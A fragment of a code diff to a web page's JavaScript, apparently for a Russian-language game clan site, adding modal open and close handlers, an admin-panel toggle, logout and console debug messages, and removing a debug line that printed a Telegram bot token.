+            // Clan members modal
+            clanMembersBtn.addEventListener('click', () => {
+                initializeClanMembersModal();
+                clanMembersModal.style.display = 'flex';
+            });
+            
+            clanMembersBtn2.addEventListener('click', () => {
+                initializeClanMembersModal();
+                clanMembersModal.style.display = 'flex';
+            });
+            
+            closeClanMembersModal.addEventListener('click', () => {
+                clanMembersModal.style.display = 'none';
+            });
+            
+            // Events modal
+            eventsBtn.addEventListener('click', () => {
+                initializeEventsModal();
+                eventsModal.style.display = 'flex';
+            });
+            
+            eventsBtn2.addEventListener('click', () => {
+                initializeEventsModal();
+                eventsModal.style.display = 'flex';
+            });
+            
+            closeEventsModal.addEventListener('click', () => {
+                eventsModal.style.display = 'none';
+            });
+            
+            // Warehouse modal
+            warehouseBtn.addEventListener('click', () => {
+                initializeWarehouseModal();
+                warehouseModal.style.display = 'flex';
+            });
+            
+            closeWarehouseModal.addEventListener('click', () => {
+                warehouseModal.style.display = 'none';
+            });
+            
+            // Modal close events
+            closeServicesModal.addEventListener('click', () => {
+                servicesModal.style.display = 'none';
+            });
+            
+            closeAdminModal.addEventListener('click', () => {
+                adminModal.style.display = 'none';
+            });
+            
+            // Close modals when clicking outside
+            window.addEventListener('click', (e) => {
+                if (e.target === servicesModal) {
+                    servicesModal.style.display = 'none';
                 }
-            }
+                if (e.target === adminModal) {
+                    adminModal.style.display = 'none';
+                }
+                if (e.target === donationModal) {
+                    donationModal.style.display = 'none';
+                }
+                if (e.target === clanMembersModal) {
+                    clanMembersModal.style.display = 'none';
+                }
+                if (e.target === eventsModal) {
+                    eventsModal.style.display = 'none';
+                }
+                if (e.target === warehouseModal) {
+                    warehouseModal.style.display = 'none';
+                }
+            });
             
-            // Test Telegram connection on load
-            console.log('🔧 Проверка подключения к Telegram...');
-            console.log('Token:', TELEGRAM_BOT_TOKEN);
-            console.log('Admin Chat IDs:', ADMIN_CHAT_IDS);
-            console.log('Admin Users:', ADMIN_USERS);
+            // Admin panel toggle
+            adminBtn.addEventListener('click', () => {
+                if (adminPanel.style.display === 'none') {
+                    adminPanel.style.display = 'block';
+                    mainContent.style.display = 'none';
+                } else {
+                    adminPanel.style.display = 'none';
+                    mainContent.style.display = 'grid';
+                }
+            });
             
-            // Initialize UI
+            // Logout
+            logoutBtn.addEventListener('click', () => {
+                currentUser = null;
+                isAdmin = false;
+                updateUI();
+            });
+            
+            // Initialize
             updateUI();
+            initializeClanMembersModal();
+            initializeEventsModal();
+            initializeWarehouseModal();
+            
+            // Debug info
+            console.log('🚀 Система клана МВД инициализирована');
+            console.log('📞 Контакты администраторов:', ADMIN_CHAT_IDS);
+            console.log('👑 Администраторы:', ADMIN_USERS);
         });
     </script>
 </body>
